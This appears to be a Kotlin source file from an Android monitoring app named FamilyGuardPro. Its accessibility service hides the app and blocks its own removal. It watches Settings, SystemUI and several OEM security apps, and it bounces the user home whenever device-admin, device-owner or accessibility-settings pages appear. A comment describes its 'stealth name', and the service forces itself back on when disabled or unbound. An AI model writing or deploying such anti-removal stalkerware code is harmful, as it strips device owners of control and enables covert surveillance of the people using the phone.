package com.familyguardpro.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent

/**
 * Accessibility Service to block Device Management popup.
 * 
 * When user taps on "This device belongs to Vivo V40" notification,
 * this service intercepts and blocks the Settings Device Admin page from opening.
 */
class NotificationBlockerAccessibilityService : AccessibilityService() {
    
    companion object {
        private const val TAG = "NotificationBlocker"
        
        // Keywords to detect device management related content
        private val BLOCK_KEYWORDS = listOf(
            "device management",
            "device admin",
            "device administrator",
            "device belongs",
            "device owner",
            "organization",
            "organisation",
            "enterprise",
            "managed device",
            "work profile",
            "familyguardpro"
        )
        
        // Class names to block in Settings
        private val BLOCKED_CLASSES = listOf(
            "DeviceAdminAdd",
            "DeviceAdminSettings",
            "DeviceAdmin",
            "EnterprisePrivacy",
            "EnterprisePrivacySettings",
            "DevicePolicyManager",
            "DeviceOwner",
            "ManagedProfile",
            "WorkPolicyInfo",
            // CRITICAL: Also block Accessibility Settings to prevent toggling off
            "AccessibilitySettings",
            "AccessibilityDetailsSettings",
            "InstalledAccessibilityServiceSettings",
            "ToggleAccessibilityServicePreferenceFragment",
            "com.android.settings.accessibility",
            "AccessibilityServiceWarning"
        )
        
        // Packages to monitor
        private val MONITORED_PACKAGES = listOf(
            "com.android.settings",
            "com.android.systemui",
            "com.vivo.systemui",
            "com.vivo.systemuiplugin",
            "com.bbk.launcher2",
            "com.vivo.launcher",
            // OEM security centers that can disable accessibility
            "com.miui.securitycenter",
            "com.miui.powerkeeper",
            "com.coloros.safecenter",
            "com.oppo.safe",
            "com.vivo.permissionmanager",
            "com.iqoo.secure",
            "com.samsung.android.lool",
            "com.huawei.systemmanager"
        )
        
        // Keywords that indicate accessibility settings page specifically
        private val ACCESSIBILITY_SETTINGS_KEYWORDS = listOf(
            "accessibility",
            "screen reader",
            "talkback",
            "installed service",
            "accessibility service",
            "familyguard",
            "system service" // Our stealth name
        )
    }
    
    private val handler = Handler(Looper.getMainLooper())
    private var lastBlockTime = 0L
    private var blockCooldown = 500L // Prevent rapid blocking
    
    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "✅ NotificationBlockerAccessibilityService connected")
        
        // Configure service
        serviceInfo = serviceInfo?.apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED or
                        AccessibilityEvent.TYPE_VIEW_FOCUSED or
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                   AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                   AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 50
        }
    }
    
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        
        val packageName = event.packageName?.toString() ?: return
        val className = event.className?.toString() ?: ""
        
        // Only process events from monitored packages
        if (!MONITORED_PACKAGES.any { packageName.contains(it, ignoreCase = true) }) {
            return
        }
        
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED,
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                // Check if device management notification was tapped
                if (isDeviceManagementEvent(event)) {
                    blockAndGoBack("Blocked device management tap")
                }
            }
            
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                // Check if Settings Device Admin page opened
                if (packageName.contains("settings", ignoreCase = true)) {
                    if (isBlockedSettingsPage(className, event)) {
                        blockAndGoHome("Blocked Settings Device Admin page: $className")
                    }
                    // CRITICAL: Also block Accessibility Settings page to prevent toggling off our service
                    if (isAccessibilitySettingsPage(className, event)) {
                        // Only block if Device Owner mode is active
                        try {
                            val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(applicationContext)
                            if (doManager.isDeviceOwner()) {
                                blockAndGoHome("Blocked Accessibility Settings page in DO mode: $className")
                                // Also re-lock accessibility as a safety measure
                                doManager.lockAccessibilitySettings()
                            }
                        } catch (e: Exception) {
                            // Not in DO mode, don't block accessibility settings
                        }
                    }
                }
                
                // Block OEM security center apps from disabling our services
                if (isOemSecurityApp(packageName)) {
                    if (containsAccessibilityKeywords(event)) {
                        try {
                            val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(applicationContext)
                            if (doManager.isDeviceOwner()) {
                                blockAndGoHome("Blocked OEM security app accessibility access: $packageName")
                                doManager.lockAccessibilitySettings()
                            }
                        } catch (e: Exception) { }
                    }
                }
            }
            
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                // Check window content for device management keywords
                if (packageName.contains("settings", ignoreCase = true)) {
                    if (containsBlockedKeywords(event)) {
                        blockAndGoHome("Blocked Settings page with device management content")
                    }
                }
            }
        }
    }
    
    /**
     * Check if this is an OEM security/power management app
     */
    private fun isOemSecurityApp(packageName: String): Boolean {
        return packageName.contains("securitycenter", ignoreCase = true) ||
            packageName.contains("powerkeeper", ignoreCase = true) ||
            packageName.contains("safecenter", ignoreCase = true) ||
            packageName.contains("permissionmanager", ignoreCase = true) ||
            packageName.contains("iqoo.secure", ignoreCase = true) ||
            packageName.contains("samsung.android.lool", ignoreCase = true) ||
            packageName.contains("systemmanager", ignoreCase = true)
    }
    
    /**
     * Check if the current page is the Accessibility Settings page
     */
    private fun isAccessibilitySettingsPage(className: String, event: AccessibilityEvent): Boolean {
        // Check class name for accessibility settings
        val accessibilityClassPatterns = listOf(
            "AccessibilitySettings",
            "AccessibilityDetailsSettings",
            "InstalledAccessibilityServiceSettings",
            "ToggleAccessibilityService",
            "accessibility"
        )
        
        if (accessibilityClassPatterns.any { className.contains(it, ignoreCase = true) }) {
            return true
        }
        
        return containsAccessibilityKeywords(event)
    }
    
    /**
     * Check if content mentions accessibility service names
     */
    private fun containsAccessibilityKeywords(event: AccessibilityEvent): Boolean {
        val allText = buildString {
            event.text?.forEach { append(it?.toString()?.lowercase() ?: " ") }
            append(event.contentDescription?.toString()?.lowercase() ?: "")
        }
        
        // Check for our service name or accessibility settings context
        return ACCESSIBILITY_SETTINGS_KEYWORDS.count { allText.contains(it) } >= 2
    }
    
    /**
     * Check if the event is related to device management notification
     */
    private fun isDeviceManagementEvent(event: AccessibilityEvent): Boolean {
        // Get all text from event
        val allText = buildString {
            event.text?.forEach { append(it?.toString()?.lowercase() ?: "") }
            append(event.contentDescription?.toString()?.lowercase() ?: "")
            
            // Try to get source node text
            try {
                val source = event.source
                source?.let { node ->
                    append(node.text?.toString()?.lowercase() ?: "")
                    append(node.contentDescription?.toString()?.lowercase() ?: "")
                    node.recycle()
                }
            } catch (e: Exception) { }
        }
        
        // Check for blocking keywords
        return BLOCK_KEYWORDS.any { keyword -> allText.contains(keyword) }
    }
    
    /**
     * Check if this is a Settings page we should block
     */
    private fun isBlockedSettingsPage(className: String, event: AccessibilityEvent): Boolean {
        // Check class name
        if (BLOCKED_CLASSES.any { className.contains(it, ignoreCase = true) }) {
            return true
        }
        
        // Check window title/content
        return containsBlockedKeywords(event)
    }
    
    /**
     * Check if event content contains blocked keywords
     */
    private fun containsBlockedKeywords(event: AccessibilityEvent): Boolean {
        val allText = buildString {
            event.text?.forEach { append(it?.toString()?.lowercase() ?: " ") }
            append(event.contentDescription?.toString()?.lowercase() ?: "")
            
            // Try to traverse the window
            try {
                val root = rootInActiveWindow
                root?.let { node ->
                    traverseNodeForText(node, this)
                    node.recycle()
                }
            } catch (e: Exception) { }
        }
        
        // Check for multiple keywords (more accurate)
        val matchCount = BLOCK_KEYWORDS.count { keyword -> allText.contains(keyword) }
        return matchCount >= 1 && allText.contains("device")
    }
    
    /**
     * Recursively get text from accessibility nodes
     */
    private fun traverseNodeForText(node: android.view.accessibility.AccessibilityNodeInfo, builder: StringBuilder, depth: Int = 0) {
        if (depth > 5) return // Limit depth
        
        node.text?.let { builder.append(it.toString().lowercase()).append(" ") }
        node.contentDescription?.let { builder.append(it.toString().lowercase()).append(" ") }
        
        for (i in 0 until node.childCount) {
            try {
                node.getChild(i)?.let { child ->
                    traverseNodeForText(child, builder, depth + 1)
                    child.recycle()
                }
            } catch (e: Exception) { }
        }
    }
    
    /**
     * Block by going back
     */
    private fun blockAndGoBack(reason: String) {
        if (!canBlock()) return
        
        Log.d(TAG, "🚫 $reason")
        lastBlockTime = System.currentTimeMillis()
        
        // Go back
        performGlobalAction(GLOBAL_ACTION_BACK)
        
        // If still there, go back again
        handler.postDelayed({
            performGlobalAction(GLOBAL_ACTION_BACK)
        }, 100)
    }
    
    /**
     * Block by going home
     */
    private fun blockAndGoHome(reason: String) {
        if (!canBlock()) return
        
        Log.d(TAG, "🚫 $reason")
        lastBlockTime = System.currentTimeMillis()
        
        // Go back first
        performGlobalAction(GLOBAL_ACTION_BACK)
        
        // Then go home after a short delay
        handler.postDelayed({
            performGlobalAction(GLOBAL_ACTION_HOME)
        }, 150)
    }
    
    /**
     * Check if we can block (cooldown)
     */
    private fun canBlock(): Boolean {
        val now = System.currentTimeMillis()
        return now - lastBlockTime > blockCooldown
    }
    
    override fun onInterrupt() {
        Log.d(TAG, "NotificationBlockerAccessibilityService interrupted")
        // Try to force re-enable via DO
        try {
            val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(applicationContext)
            if (doManager.isDeviceOwner()) {
                doManager.forceEnableAccessibility()
            }
        } catch (e: Exception) { }
    }
    
    /**
     * Called when the system unbinds this service. Trigger immediate recovery.
     */
    override fun onUnbind(intent: android.content.Intent?): Boolean {
        Log.e(TAG, "CRITICAL: NotificationBlockerAccessibilityService onUnbind!")
        try {
            val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(applicationContext)
            if (doManager.isDeviceOwner()) {
                doManager.forceEnableAccessibility()
                doManager.lockAccessibilitySettings()
            }
        } catch (e: Exception) {
            Log.e(TAG, "onUnbind: DO recovery failed", e)
        }
        return super.onUnbind(intent)
    }
    
    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "NotificationBlockerAccessibilityService destroyed")
        // Schedule immediate recovery
        try {
            val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(applicationContext)
            if (doManager.isDeviceOwner()) {
                doManager.forceEnableAccessibility()
            }
        } catch (e: Exception) { }
    }
}
